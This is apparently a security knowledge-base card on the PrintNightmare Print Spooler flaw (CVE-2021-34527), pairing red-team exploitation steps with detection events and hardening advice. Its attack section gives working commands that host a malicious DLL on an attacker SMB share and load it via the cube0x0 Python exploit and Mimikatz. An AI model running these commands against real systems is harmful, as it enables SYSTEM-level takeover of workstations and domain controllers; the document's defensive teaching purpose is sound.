# [PE-EXPLOIT-001]: PrintNightmare Remote Privilege Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-EXPLOIT-001 |
| **MITRE ATT&CK v18.1** | [Exploitation for Privilege Escalation (T1068)](https://attack.mitre.org/techniques/T1068/) |
| **Tactic** | Privilege Escalation / Remote Code Execution |
| **Platforms** | Windows Endpoint / AD |
| **Severity** | **Critical** |
| **CVE** | **CVE-2021-34527** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Windows Print Spooler service (`spoolsv.exe`) improperly restricts access to the `RpcAddPrinterDriverEx` function. An authenticated user (even a low-privilege one) can remotely install a printer driver. By specifying a malicious DLL located on an SMB share as the "driver," the Spooler service (running as SYSTEM) loads and executes the DLL.
- **Attack Surface:** SMB / RPC (TCP 445/135) on Domain Controllers or Workstations.
- **Business Impact:** **Instant System/Domain Compromise**. Often used to take over Domain Controllers.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Authenticated User.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [PrintNightmare.py](https://github.com/cube0x0/CVE-2021-34527)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Host Payload**
Host a malicious DLL on an SMB share readable by the target.
```bash
smbserver.py SHARE . -smb2support
```

**Step 2: Exploit (Python)**
```bash
python3 CVE-2021-34527.py domain/user:pass@192.168.1.10 '\\attacker\SHARE\evil.dll'
```

**Step 3: Exploit (Mimikatz)**
```cmd
misc::printnightmare /server:dc01 /library:\\attacker\SHARE\evil.dll
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Endpoint Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Microsoft-Windows-PrintService** | 316 / 808 | "Driver added". Look for paths pointing to UNC shares (e.g., `\\10.10...`). |
| **Sysmon** | 11 | FileCreate by `spoolsv.exe` dropping DLLs into `System32\spool\drivers`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Disable Spooler:** Stop and disable the Print Spooler service on Domain Controllers.
*   **GPO:** Configure "Point and Print Restrictions" to block non-admin users from installing drivers.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-001]
> **Next Logical Step:** [CA-UNSC-001] (DCSync)
